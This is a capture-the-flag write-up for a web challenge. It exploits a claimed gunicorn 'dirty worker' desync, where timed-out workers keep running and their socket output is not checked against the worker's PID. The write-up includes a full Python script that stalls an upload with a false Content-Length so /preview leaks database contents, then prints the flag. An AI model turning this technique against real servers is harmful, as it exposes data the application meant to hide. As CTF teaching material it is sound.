# Delivery Support
- Category: web
- Author: sanmatte

## Description
Given description:
> Talk to me, talk dirty babe.

## Details
The site allows users to upload documents into a db. It allows documents to the
displayed through a `/preview` endpoint or to calculate the entire hash of the
db through the `/integrity` endpoint. 

The preview endpoint does not allow to see the flag.

The website configuration uses `dirty workers`. A dirty worker, is a special
type of worker designed by `gunicorn` to handle computationally complex
operations, such as ML or DL.

In the site we use the dirty worker to:
- return the content of the database for `/preview`
- return the content of the database for `/integrity` before we calcualte the hash.

## Desync
Since its introduction up to release `26.1.0`, the gunicorn dirty worker was
vulnerable to several bugs.

Two bugs particularly allow the exploitation of this challenge.

- When the dirty worker exceeds its timeout, it should be killed by the arbiter.
  But it is not, so it continues with its operations and returns its output on
  the dirty worker communication socket.
- The arbiter should check if the output written on the socket comes from the
  last spawned dirty worker. But its does not happen so any message written on
  the socket is treated as the last message, without any PID check.

This means that, if we are able to make a dirty worker exceed its timeout timer,
we can desync the server. As stated before, the `/preview` endpoint does not
return the content of the flag, because it is excluded from the SQL queries to
the DB.

However, when we invoke the dirty worker for the `/integrity` call the entire DB
content is written on the socket, but not shown to the response, since it is
used to calculate the hash.

Summing up, if we are able to make the dirty worker socket desync, we can read
with `/preview` the output of the dirty worker called in `/integrity`.

## Exploit
How do we make the dirty worker crash?

In the `/upload` functionality, a database transaction is started like this:
```python
    with connect() as db:
        cursor = db.execute(
            "INSERT INTO documents(owner, name, body) VALUES ('guest', ?, X'')",
            (name,),
        )
        while chunk := request.stream.read(4096):
            body.extend(chunk)
        db.execute(
            "UPDATE documents SET body=? WHERE id=? AND owner='guest'",
            (body, cursor.lastrowid),
        )
```
where the DB timeout is higher than the dirty worker timeout.
Since the `/preview` endpoint also interacts with the db, if we make the
`/upload` lock last longer than the `/preview` dirty worker timer, it will
"crash" causing the desyncronization described earlier.

To make the `/upload` lock last longer we can exploit this:
```py
        while chunk := request.stream.read(4096):
            body.extend(chunk)
```
In fastapi, reading from request, does not use the actual body size passed, but
it uses the `content-lenght` so when we pass a very big content-lenght but less
body bytes, it will wait until all bytes are received. We can exploit this to
make it hang for a few seconds.

```python
#!/usr/bin/env python3
import ssl
import http.client
import re
import socket
import time

HOST = "web-late-night-dirty-talk-a0bee25c9a9c6373.instances.srdnlen.it"
PORT = 443
SIZE = 65536


def request(path):
    connection = http.client.HTTPSConnection(HOST, PORT, timeout=8)
    connection.request("GET", path)
    response = connection.getresponse()
    body = response.read()
    connection.close()
    return response.status, body


def main():
    raw = socket.create_connection((HOST, PORT), timeout=8)
    upload = ssl.create_default_context().wrap_socket(
        raw, server_hostname=HOST
    )

    headers = (
        "POST /upload HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Length: {SIZE}\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Connection: close\r\n\r\n"
    )

    upload.sendall(headers.encode() + b"A")
    time.sleep(0.5)

    status, body = request("/integrity")
    print(f"integrity: {status} {body.decode(errors='replace')}")

    if status != 504:
        raise SystemExit("integrity did not time out; retry the exploit")

    upload.sendall(b"B" * (SIZE - 1))

    while upload.recv(4096):
        pass

    upload.close()
    time.sleep(0.2)

    status, body = request("/preview")
    text = body.decode(errors="replace")
    shown = text if len(text) <= 512 else text[:512] + "\n[output shortened]"

    print(f"preview: {status}\n{shown}")

    match = re.search(r"srdnlen\{[^}\r\n]+\}", text)

    if not match:
        raise SystemExit("flag not found; the worker stream may need another request")

    print(f"flag: {match.group(0)}")


if __name__ == "__main__":
    main()
```


## Flag
`srdnlen{vn0de_1nj3ct1on_are_4_th1ng_uh}`

